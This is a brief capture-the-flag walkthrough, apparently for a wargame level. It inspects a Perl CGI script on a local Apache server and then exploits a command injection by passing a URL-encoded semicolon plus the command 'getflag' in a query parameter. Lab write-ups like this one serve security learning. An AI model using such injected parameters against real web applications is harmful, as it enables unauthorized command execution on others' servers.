CMD:
    cat level04.pl
STEP:
    check the conf of the server, it's apache, now we have to figure out the routes to use the executable.
CMD:
    curl "http://localhost:4747/level04.pl?x=1"

STEP:
    it prints "1" on the terminal
    we can do a command injection

STEP:
    curl "http://localhost:4747/level04.pl?x=%3Bgetflag"

END:
    we get the flag